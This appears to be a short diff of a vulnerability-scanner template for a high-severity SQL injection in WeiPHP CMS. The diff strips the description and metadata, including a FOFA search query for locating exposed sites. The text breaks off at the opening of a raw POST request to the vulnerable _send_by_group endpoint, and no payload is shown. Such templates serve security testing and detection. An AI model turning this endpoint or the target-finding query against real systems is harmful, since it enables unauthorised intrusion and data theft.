@@ -3,12 +3,8 @@ info:
   name: weiphp cms _send_by_group sql注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fqhv1lgu2wa2z94l'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fqhv1lgu2wa2z94l
-    fofa: body="/css/weiphp.css" || body="WeiPHP"
 http:
 - raw:
   - 'POST /public/index.php/weixin/message/_send_by_group HTTP/1.1
